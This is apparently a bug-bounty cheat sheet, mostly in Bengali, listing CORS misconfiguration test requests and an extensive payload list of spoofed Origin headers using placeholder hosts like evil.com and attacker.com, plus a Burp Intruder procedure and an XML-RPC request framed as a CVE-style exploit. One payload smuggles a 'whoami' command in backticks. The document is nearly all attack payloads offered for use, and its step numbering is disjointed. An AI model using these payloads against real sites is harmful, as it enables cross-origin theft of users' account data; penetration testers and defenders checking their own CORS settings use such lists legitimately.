# 🚀 CORS Misconfiguration Payloads 2026

> Complete payload list for detecting and exploiting CORS misconfigurations in modern web applications.

🔴 পেলোড ১: Origin Reflection Test
http
GET /api/accountDetails HTTP/1.1
Host: target.com
Origin: https://evil.com
Cookie: session=abc123
Response চেক করুন:

http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com  ← আপনার origin আসলে VULNERABLE!
Access-Control-Allow-Credentials: true
🔴 পেলোড ২: Null Origin Test
http
GET /api/accountDetails HTTP/1.1
Host: target.com
Origin: null
Cookie: session=abc123
🔴 পেলোড ৩: Subdomain Bypass (CVEs অনুযায়ী) 
http
GET /api/accountDetails HTTP/1.1
Host: target.com
Origin: https://target.com.evil.com
http
Origin: https://evil.com.target.com
Origin: https://trusted.example.com.evil.com
এটি Jupyter Server-এ রিয়েল CVE ধরা পড়েছিল 

🚀 ধাপ ৩: Intruder ব্যবহার করে Bulk Test (সবচেয়ে কার্যকর)
কিভাবে করবেন:
রিকোয়েস্টে Send to Intruder (Ctrl+I)

Origin: §evil.com§ - payload position সেট করুন

নিচের পেলোডগুলো পেস্ট করুন:

txt
https://evil.com
null
https://target.com.evil.com
https://evil.com.target.com
https://target.com@evil.com
https://evil.com#target.com
https://evil.com/target.com
https://evil.com%2Etarget.com
https://evil.com%252Etarget.com
https://target.com.evil.com:8080
evil.com
http://evil.com
https://evil.com%00.target.com
https://target.com%00.evil.com
https://evil.com%09.target.com
https://evil.com%0d%0a.target.com
https://subdomain.target.com
https://evil.com/`whoami`
*
http://null
https://null
file://
কিভাবে ফলাফল ফিল্টার করবেন:
Attack ফলাফলে Access-Control-Allow-Origin কলাম দেখুন

যে পেলোডগুলোর জন্য এই হেডার আপনার দেওয়া origin এর সাথে match করছে, সেগুলো vulnerable

💣 ধাপ ৪: 2026 সালের Real CVE-ভিত্তিক Advanced Exploit 
4.1 Access-Control-Allow-Origin: * + credentials scenario 
http
GET /api/memories HTTP/1.1
Host: mcp-memory-service.local
Origin: https://attacker.com
Response দেখুন:

http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true   ← CRITICAL! Wildcard + credentials = dangerous
4.2 XML-RPC Server Exploit (CVE-2026-32610 style) 
text
POST /RPC2 HTTP/1.1
Host: target.com
Content-Type: text/plain
Origin: https://attacker.com

<?xml version="1.0"?>
<methodCall>
    <methodName>getAll</methodName>
</methodCall>



---

## 📋 Payload List

```http
Origin: https://evil.com
Origin: https://evil.com.evil.com
Origin: https://evil.com.target.com
Origin: https://target.com.evil.com
Origin: https://evil.com@target.com
Origin: https://evil.com#target.com
Origin: https://evil.com/target.com
Origin: https://evil.com%2Etarget.com
Origin: https://evil.com%252Etarget.com
Origin: https://target.com.evil.com:8080
Origin: https://evil.com.target.com:8080
Origin: https://subdomain.target.com
Origin: https://target.com.attacker.com
Origin: https://attacker.com.target.com
Origin: https://target.com.任意
Origin: https://任意.target.com
Origin: null
Origin: https://null
Origin: http://null
Origin: file://
Origin: https://evil.com%00.target.com
Origin: https://target.com%00.evil.com
Origin: https://evil.com%09.target.com
Origin: https://target.com%09.evil.com
Origin: https://evil.com%0A.target.com
Origin: https://target.com%0A.evil.com
Origin: https://evil.com%0D.target.com
Origin: https://target.com%0D.evil.com
Origin: https://evil.com%20.target.com
Origin: https://target.com%20.evil.com
Origin: https://evil.com/target.com//
Origin: https://target.com.evil.com//
Origin: https://evil.com@target.com:443
Origin: https://target.com@evil.com:443
Origin: *
Origin: https://*.target.com
Origin: http://evil.com
Origin: https://evil.com:8080
Origin: https://evil.com?target.com
Origin: https://target.com.evil.com?q=test
Origin: https://evil.com.target.com/admin
Origin: https://target.com\@evil.com
Origin: https://target.com.evil.com%2Fpath
Origin: https://evil.com%5C.target.com
Origin: https://target.com%5C.evil.com
Origin: https://target.com.evil.com/admin
Origin: https://admin-target.com.evil.com
Origin: https://target.com.evil.com/api
Origin: https://api.target.com.evil.com
Origin: https://target.com.evil.com/graphql
Origin: https://target.com.evil.com/oauth
Origin: https://target.com.evil.com/webauthn
